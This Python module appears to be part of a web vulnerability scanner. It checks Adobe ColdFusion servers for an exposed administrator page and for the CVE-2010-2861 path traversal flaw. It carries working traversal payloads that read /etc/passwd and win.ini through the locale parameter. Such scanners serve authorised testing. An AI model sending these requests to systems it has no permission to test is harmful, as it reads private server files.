import asyncio
from modules.core import console

# Adobe ColdFusion Scanner (Enterprise Server RCE)
# Focus: CVE-2010-2861 (LFI/Traversal) and Admin Exposure.
# Endpoint: /CFIDE/administrator/enter.cfm

async def check_coldfusion(session, url):
    try:
        # 1. Admin Exposure
        admin_url = f"{url.rstrip('/')}/CFIDE/administrator/enter.cfm"
        async with session.get(admin_url, timeout=5, ssl=False) as resp:
            if resp.status == 200 and "ColdFusion" in await resp.text():
                 pass # Confirmed CF

        # 2. LFI (CVE-2010-2861)
        # /CFIDE/administrator/enter.cfm?locale=../../../../../../../../../../etc/passwd%00en
        
        lfi_payload = f"{url.rstrip('/')}/CFIDE/administrator/enter.cfm?locale=../../../../../../../../../../etc/passwd%00en"
        
        async with session.get(lfi_payload, timeout=5, ssl=False) as lfi_resp:
            text = await lfi_resp.text()
            if "root:x:0:0" in text:
                 return {
                    "url": lfi_payload,
                    "type": "ColdFusion LFI (CVE-2010-2861)",
                    "evidence": "/etc/passwd leaked via locale parameter."
                }
            
            # Windows check
            lfi_win = f"{url.rstrip('/')}/CFIDE/administrator/enter.cfm?locale=../../../../../../../../../../Windows/win.ini%00en"
            async with session.get(lfi_win, timeout=5, ssl=False) as win_resp:
                if "[extensions]" in await win_resp.text():
                     return {
                        "url": lfi_win,
                        "type": "ColdFusion LFI (CVE-2010-2861)",
                        "evidence": "win.ini leaked via locale parameter."
                    }

    except Exception:
        pass
    return None

async def scan_coldfusion(session, url):
    """
    Scan for Adobe ColdFusion Vulnerabilities.
    """
    console.print(f"\n[bold cyan]--- ColdFusion Scanner ---[/bold cyan]")
    
    results = []
    res = await check_coldfusion(session, url)
    if res:
         console.print(f"  [bold red][!] COLDFUSION VULNERABLE: {res['url']}[/bold red]")
         console.print(f"      Status: {res['type']}")
         results.append(res)
         
    if not results:
        console.print("[dim][-] No ColdFusion LFI vectors found.[/dim]")
        
    return results
